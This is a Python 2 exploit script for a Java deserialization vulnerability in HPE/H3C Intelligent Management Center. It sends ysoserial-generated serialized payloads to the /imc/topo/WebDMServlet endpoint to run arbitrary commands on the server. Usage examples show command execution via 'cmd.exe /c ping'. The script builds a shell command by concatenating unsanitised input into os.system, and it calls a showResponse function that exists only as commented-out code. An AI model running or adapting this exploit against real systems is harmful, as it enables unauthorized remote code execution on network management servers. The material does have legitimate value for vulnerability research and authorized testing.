#!/usr/bin/env python

########################################################################################################
# 
# HPE/H3C IMC - Java Deserialization Exploit
#
# Version 0.1
#    Tested on Windows Server 2008 R2
#    Name	HPE/H3C IMC (Intelligent Management Center)	Java 1.8.0_91
#
# Author:
# Raphael Kuhn (Daimler TSS)
# 
# Special thanks to:
# Jan Esslinger (@H_ng_an) for the websphere exploit this one is based upon
#
#######################################################################################################

import requests
import sys
import os
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

host         = "127.0.0.1:8080"
payload_file = "payload.bin"
body        = ""

def printUsage () :
    print "......................................................................................................................"
    print "."
    print ". HPE/H3C - IMC Java Deserialization Exploit"
    print "."
    print ". Example 1: -payload-binary"
    print ". [-] Usage: %s http[s]://<IP>:<PORT> -payload-binary payload" % sys.argv[0]
    print ". [-] Example: %s https://127.0.0.1:8880 -payload-binary ysoserial_payload.bin" % sys.argv[0]
    print ".     1. Create payload with ysoserial.jar (https://github.com/frohoff/ysoserial/releases) "
    print ".        java -jar ysoserial.jar CommonsCollections3 'cmd.exe /c ping -n 1 53.48.79.183' > ysoserial_payload.bin"
    print ".     2. Send request to server"
    print ".        %s https://127.0.0.1:8880 -payload-binary ysoserial_payload.bin"  % sys.argv[0]
    print "."
    print ". Example 2: -payload-string"
    print '. [-] Usage: %s http[s]://<IP>:<PORT> -payload-string "payload"' % sys.argv[0]
    print '. [-] Example: %s https://127.0.0.1:8880 -payload-string "cmd.exe /c ping -n 1 53.48.79.183"' % sys.argv[0]
    print ".     1. Send request to server with payload as string (need ysoserial.jar in the same folder)"
    print '.        %s https://127.0.0.1:8880 -payload-string "cmd.exe /c ping -n 1 53.48.79.183"'  % sys.argv[0]
    print "."
    print "......................................................................................................................"

def loadPayloadFile (_fileName) :
    print "[+] Load payload file %s" % _fileName
    payloadFile = open(_fileName, 'rb')
    payloadFile_read = payloadFile.read()
    return payloadFile_read

def exploit (_payload) :
    url = sys.argv[1]
    url += "/imc/topo/WebDMServlet"
    print "[+] Sending exploit to %s" % (url) 
    data = _payload
    response = requests.post(url, data=data, verify=False)
    return response

#def showResponse(_response):
#    r = response
#    m = r.search(_response)
#    if (m.find("java.lang.NullPointerException")):
#        print "[+] Found java.lang.NullPointerException, exploit finished successfully (hopefully)"
#    else:
#        print "[-] ClassCastException not found, exploit failed"


if __name__ == "__main__":
    if len(sys.argv) < 4:
        printUsage()
        sys.exit(0)
    else:
        print "------------------------------------------"
        print "- HPE/H3C - IMC Java Deserialization Exploit -"
        print "------------------------------------------"
        host = sys.argv[1]
        print "[*] Connecting to %s" %host
    if sys.argv[2] == "-payload-binary":
        payload_file = sys.argv[3]
        if os.path.isfile(payload_file):
            payload = loadPayloadFile(payload_file)
            response = exploit(payload)
            showResponse(response.content)
        else:
            print "[-] Can't load payload file"
    elif sys.argv[2] == "-payload-string":
            if os.path.isfile("ysoserial.jar"):
                sPayload = sys.argv[3]
                sPayload = "java -jar ysoserial.jar CommonsCollections5 '" +sPayload+ "' > payload.bin"
                print "[+] Create payload file (%s) " %sPayload
                os.system(sPayload)
                payload = loadPayloadFile(payload_file)
                response = exploit(payload)
                print "[+] Response received, exploit finished."
            else:
                print "[-] Can't load ysoserial.jar"
    else:
        printUsage()